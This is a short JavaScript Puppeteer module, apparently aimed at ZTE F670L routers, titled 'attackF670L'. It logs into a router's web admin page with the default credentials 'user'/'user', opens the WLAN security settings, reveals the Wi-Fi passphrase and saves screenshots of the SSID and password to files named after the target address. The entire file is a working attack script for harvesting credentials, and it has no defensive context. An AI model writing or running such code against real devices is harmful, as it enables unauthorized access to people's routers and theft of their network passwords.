export default async function attackF670L(page, endereco) {
    {
        await page.focus("#Frm_Username");
        await page.keyboard.type("user");
    }
    {
        await page.focus("#Frm_Password");
        await page.keyboard.type("user");
    }
    {
        await page.click("#LoginId")
    }
    {
        await page.waitForTimeout(5000)
        const frame = page.frames()
            .filter(frame => frame.url().includes("template") || frame.url().includes("getpage"))[0]

        await page.waitForTimeout(3000);
        await frame.click("#mmNet");

        await page.waitForTimeout(3000);
        await frame.click("#smWLANONE")

        await page.waitForTimeout(3000);
        await frame.click("#ssmWLANMul1")

        const enderecoUrlFoto = endereco
            .replace("http://", "");

        await page.screenshot({
            path: `./fotos/${enderecoUrlFoto}-ssid.png`,
            fullPage: true
        });

        await page.waitForTimeout(3000);
        await frame.click("#ssmWLANSec1");


        await page.waitForTimeout(3000);
        await frame.click("#Frm_ShowKeyPassphrase");

        await page.screenshot({
            path: `./fotos/${enderecoUrlFoto}-password.png`,
            fullPage: true
        });
    }
}